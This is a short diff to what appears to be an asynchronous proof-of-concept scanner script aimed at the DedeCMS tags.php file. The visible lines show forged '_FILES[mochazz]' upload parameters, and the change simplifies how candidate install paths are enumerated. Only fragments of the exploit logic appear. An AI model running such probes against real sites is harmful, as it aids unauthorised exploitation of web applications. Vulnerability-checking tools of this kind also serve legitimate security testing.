@@ -30,14 +30,8 @@ class POC(Script):
                 "_FILES[mochazz][size]": 0,
                 "_FILES[mochazz][type]": "image/gif"
             }
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.base_url, '../dedecms/'),
-                self.url_normpath(self.url, 'dedecms/'),
-                self.url_normpath(self.url, '../dedecms/'),
-            ]))
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, ['./dedecms/', './']):
                     url = path + 'tags.php'
                     back_dir = ""
                     flag = 0
